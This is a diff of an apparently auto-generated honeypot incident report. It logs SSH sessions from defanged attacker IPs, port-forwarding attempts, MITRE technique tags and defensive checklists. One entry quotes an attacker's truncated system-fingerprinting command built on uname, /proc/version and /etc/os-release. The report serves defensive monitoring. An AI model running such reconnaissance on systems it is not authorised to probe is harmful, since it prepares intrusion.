-**Recommended Actions:**
-- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
-- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-c41281d07624
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 12:59 |
-| **Last Seen** | 2026-08-22 12:59 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 12:59:19` | `cowrie.session.connect` |
-| `2026-08-22 12:59:19` | `cowrie.client.version` |
-| `2026-08-22 12:59:20` | `cowrie.client.kex` |
-| `2026-08-22 12:59:20` | `cowrie.login.success` |
-| `2026-08-22 12:59:21` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 12:59:21` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 12:59:21` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 12:59:21` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-f1414d29f4dd
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `78.189.17[.]35` |
-| **First Seen** | 2026-08-22 12:59 |
-| **Last Seen** | 2026-08-22 12:59 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 12:59:26` | `cowrie.session.connect` |
-| `2026-08-22 12:59:27` | `cowrie.client.version` |
-| `2026-08-22 12:59:27` | `cowrie.client.kex` |
-| `2026-08-22 12:59:28` | `cowrie.login.success` |
-| `2026-08-22 12:59:28` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 12:59:33` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
-- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-76b17fdcafa1
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 12:59 |
-| **Last Seen** | 2026-08-22 12:59 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:51 |
+| **Last Seen** | 2026-08-22 15:51 |
 | **Session Duration** | 4s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -711,99 +2917,37 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 12:59:51` | `cowrie.session.connect` |
-| `2026-08-22 12:59:51` | `cowrie.client.version` |
-| `2026-08-22 12:59:51` | `cowrie.client.kex` |
-| `2026-08-22 12:59:53` | `cowrie.login.success` |
-| `2026-08-22 12:59:54` | `cowrie.session.params` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.success` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:54` | `cowrie.command.input` |
-| `2026-08-22 12:59:55` | `cowrie.log.closed` |
-| `2026-08-22 12:59:55` | `cowrie.session.closed` |
+| `2026-08-22 15:51:04` | `cowrie.session.connect` |
+| `2026-08-22 15:51:05` | `cowrie.client.version` |
+| `2026-08-22 15:51:05` | `cowrie.client.kex` |
+| `2026-08-22 15:51:06` | `cowrie.login.success` |
+| `2026-08-22 15:51:08` | `cowrie.session.params` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.success` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.command.input` |
+| `2026-08-22 15:51:08` | `cowrie.log.closed` |
+| `2026-08-22 15:51:09` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-00dc1c4cb992
+### 🔴 HIGH · IR-68ce058a0639
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `37.25.36[.]197` |
-| **First Seen** | 2026-08-22 13:00 |
-| **Last Seen** | 2026-08-22 13:00 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:00:45` | `cowrie.session.connect` |
-| `2026-08-22 13:00:45` | `cowrie.client.version` |
-| `2026-08-22 13:00:45` | `cowrie.client.kex` |
-| `2026-08-22 13:00:46` | `cowrie.login.success` |
-| `2026-08-22 13:00:47` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:00:51` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `37.25.36[.]197` to AbuseIPDB if not already reported
-- [ ] Block `37.25.36[.]197` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-be6e5629a053
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `66.179.137[.]169` |
-| **First Seen** | 2026-08-22 13:00 |
-| **Last Seen** | 2026-08-22 13:00 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:00:52` | `cowrie.session.connect` |
-| `2026-08-22 13:00:52` | `cowrie.client.version` |
-| `2026-08-22 13:00:52` | `cowrie.client.kex` |
-| `2026-08-22 13:00:53` | `cowrie.login.success` |
-| `2026-08-22 13:00:53` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:00:58` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `66.179.137[.]169` to AbuseIPDB if not already reported
-- [ ] Block `66.179.137[.]169` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-400112fcd873
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:01 |
-| **Last Seen** | 2026-08-22 13:01 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:52 |
+| **Last Seen** | 2026-08-22 15:52 |
 | **Session Duration** | 4s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -814,37 +2958,78 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:01:22` | `cowrie.session.connect` |
-| `2026-08-22 13:01:22` | `cowrie.client.version` |
-| `2026-08-22 13:01:22` | `cowrie.client.kex` |
-| `2026-08-22 13:01:24` | `cowrie.login.success` |
-| `2026-08-22 13:01:25` | `cowrie.session.params` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.success` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:25` | `cowrie.command.input` |
-| `2026-08-22 13:01:26` | `cowrie.log.closed` |
-| `2026-08-22 13:01:26` | `cowrie.session.closed` |
+| `2026-08-22 15:52:17` | `cowrie.session.connect` |
+| `2026-08-22 15:52:18` | `cowrie.client.version` |
+| `2026-08-22 15:52:18` | `cowrie.client.kex` |
+| `2026-08-22 15:52:19` | `cowrie.login.success` |
+| `2026-08-22 15:52:21` | `cowrie.session.params` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.success` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.command.input` |
+| `2026-08-22 15:52:21` | `cowrie.log.closed` |
+| `2026-08-22 15:52:22` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-472759c6a3c9
+### 🔴 HIGH · IR-a9f73769e2ba
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:02 |
-| **Last Seen** | 2026-08-22 13:02 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:53 |
+| **Last Seen** | 2026-08-22 15:53 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:53:40` | `cowrie.session.connect` |
+| `2026-08-22 15:53:41` | `cowrie.client.version` |
+| `2026-08-22 15:53:41` | `cowrie.client.kex` |
+| `2026-08-22 15:53:42` | `cowrie.login.success` |
+| `2026-08-22 15:53:43` | `cowrie.session.params` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.success` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:43` | `cowrie.command.input` |
+| `2026-08-22 15:53:44` | `cowrie.log.closed` |
+| `2026-08-22 15:53:44` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-96d803646609
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:55 |
+| **Last Seen** | 2026-08-22 15:55 |
 | **Session Duration** | 3s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -855,37 +3040,37 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:02:53` | `cowrie.session.connect` |
-| `2026-08-22 13:02:53` | `cowrie.client.version` |
-| `2026-08-22 13:02:53` | `cowrie.client.kex` |
-| `2026-08-22 13:02:54` | `cowrie.login.success` |
-| `2026-08-22 13:02:55` | `cowrie.session.params` |
-| `2026-08-22 13:02:55` | `cowrie.command.input` |
-| `2026-08-22 13:02:55` | `cowrie.command.input` |
-| `2026-08-22 13:02:55` | `cowrie.command.input` |
-| `2026-08-22 13:02:55` | `cowrie.command.input` |
-| `2026-08-22 13:02:55` | `cowrie.command.input` |
-| `2026-08-22 13:02:55` | `cowrie.command.success` |
-| `2026-08-22 13:02:56` | `cowrie.command.input` |
-| `2026-08-22 13:02:56` | `cowrie.command.input` |
-| `2026-08-22 13:02:56` | `cowrie.command.input` |
-| `2026-08-22 13:02:56` | `cowrie.command.input` |
-| `2026-08-22 13:02:56` | `cowrie.log.closed` |
-| `2026-08-22 13:02:56` | `cowrie.session.closed` |
+| `2026-08-22 15:55:04` | `cowrie.session.connect` |
+| `2026-08-22 15:55:04` | `cowrie.client.version` |
+| `2026-08-22 15:55:04` | `cowrie.client.kex` |
+| `2026-08-22 15:55:05` | `cowrie.login.success` |
+| `2026-08-22 15:55:07` | `cowrie.session.params` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.success` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.command.input` |
+| `2026-08-22 15:55:07` | `cowrie.log.closed` |
+| `2026-08-22 15:55:07` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-751138f1f02e
+### 🔴 HIGH · IR-0d12bb4ec6e6
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:04 |
-| **Last Seen** | 2026-08-22 13:04 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:56 |
+| **Last Seen** | 2026-08-22 15:56 |
 | **Session Duration** | 2s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -896,37 +3081,37 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:04:25` | `cowrie.session.connect` |
-| `2026-08-22 13:04:25` | `cowrie.client.version` |
-| `2026-08-22 13:04:25` | `cowrie.client.kex` |
-| `2026-08-22 13:04:26` | `cowrie.login.success` |
-| `2026-08-22 13:04:27` | `cowrie.session.params` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.success` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.command.input` |
-| `2026-08-22 13:04:27` | `cowrie.log.closed` |
-| `2026-08-22 13:04:27` | `cowrie.session.closed` |
+| `2026-08-22 15:56:26` | `cowrie.session.connect` |
+| `2026-08-22 15:56:26` | `cowrie.client.version` |
+| `2026-08-22 15:56:26` | `cowrie.client.kex` |
+| `2026-08-22 15:56:27` | `cowrie.login.success` |
+| `2026-08-22 15:56:28` | `cowrie.session.params` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.success` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.command.input` |
+| `2026-08-22 15:56:28` | `cowrie.log.closed` |
+| `2026-08-22 15:56:29` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-3a487a1bad6a
+### 🔴 HIGH · IR-4630b0e952bd
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:05 |
-| **Last Seen** | 2026-08-22 13:06 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:57 |
+| **Last Seen** | 2026-08-22 15:57 |
 | **Session Duration** | 2s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -937,37 +3122,99 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:05:59` | `cowrie.session.connect` |
-| `2026-08-22 13:05:59` | `cowrie.client.version` |
-| `2026-08-22 13:05:59` | `cowrie.client.kex` |
-| `2026-08-22 13:06:00` | `cowrie.login.success` |
-| `2026-08-22 13:06:01` | `cowrie.session.params` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.success` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.command.input` |
-| `2026-08-22 13:06:01` | `cowrie.log.closed` |
-| `2026-08-22 13:06:01` | `cowrie.session.closed` |
+| `2026-08-22 15:57:47` | `cowrie.session.connect` |
+| `2026-08-22 15:57:48` | `cowrie.client.version` |
+| `2026-08-22 15:57:48` | `cowrie.client.kex` |
+| `2026-08-22 15:57:48` | `cowrie.login.success` |
+| `2026-08-22 15:57:49` | `cowrie.session.params` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.success` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:49` | `cowrie.command.input` |
+| `2026-08-22 15:57:50` | `cowrie.log.closed` |
+| `2026-08-22 15:57:50` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-0ad6913a78ca
+### 🔴 HIGH · IR-59ff7d6ab47d
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:07 |
-| **Last Seen** | 2026-08-22 13:07 |
+| **Source IP** | `46.4.112[.]25` |
+| **First Seen** | 2026-08-22 15:58 |
+| **Last Seen** | 2026-08-22 15:58 |
+| **Session Duration** | 5s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:58:26` | `cowrie.session.connect` |
+| `2026-08-22 15:58:26` | `cowrie.client.version` |
+| `2026-08-22 15:58:26` | `cowrie.client.kex` |
+| `2026-08-22 15:58:27` | `cowrie.login.success` |
+| `2026-08-22 15:58:27` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:58:31` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `46.4.112[.]25` to AbuseIPDB if not already reported
+- [ ] Block `46.4.112[.]25` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5c93f4aa293d
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `177.174.0[.]3` |
+| **First Seen** | 2026-08-22 15:58 |
+| **Last Seen** | 2026-08-22 15:58 |
+| **Session Duration** | 7s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:58:32` | `cowrie.session.connect` |
+| `2026-08-22 15:58:33` | `cowrie.client.version` |
+| `2026-08-22 15:58:33` | `cowrie.client.kex` |
+| `2026-08-22 15:58:34` | `cowrie.login.success` |
+| `2026-08-22 15:58:35` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:58:40` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
+- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-2bbf0efd43b3
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:59 |
+| **Last Seen** | 2026-08-22 15:59 |
 | **Session Duration** | 2s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -978,37 +3225,37 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:07:42` | `cowrie.session.connect` |
-| `2026-08-22 13:07:42` | `cowrie.client.version` |
-| `2026-08-22 13:07:42` | `cowrie.client.kex` |
-| `2026-08-22 13:07:43` | `cowrie.login.success` |
-| `2026-08-22 13:07:44` | `cowrie.session.params` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.success` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:44` | `cowrie.command.input` |
-| `2026-08-22 13:07:45` | `cowrie.log.closed` |
-| `2026-08-22 13:07:45` | `cowrie.session.closed` |
+| `2026-08-22 15:59:15` | `cowrie.session.connect` |
+| `2026-08-22 15:59:16` | `cowrie.client.version` |
+| `2026-08-22 15:59:16` | `cowrie.client.kex` |
+| `2026-08-22 15:59:16` | `cowrie.login.success` |
+| `2026-08-22 15:59:17` | `cowrie.session.params` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.success` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:17` | `cowrie.command.input` |
+| `2026-08-22 15:59:18` | `cowrie.log.closed` |
+| `2026-08-22 15:59:18` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-a960fc0f3220
+### 🔴 HIGH · IR-0829836e1b32
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:09 |
-| **Last Seen** | 2026-08-22 13:09 |
+| **First Seen** | 2026-08-22 15:59 |
+| **Last Seen** | 2026-08-22 15:59 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1019,14 +3266,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:09:09` | `cowrie.session.connect` |
-| `2026-08-22 13:09:09` | `cowrie.client.version` |
-| `2026-08-22 13:09:09` | `cowrie.client.kex` |
-| `2026-08-22 13:09:10` | `cowrie.login.success` |
-| `2026-08-22 13:09:10` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:09:10` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:09:10` | `cowrie.direct-tcpip.data` |
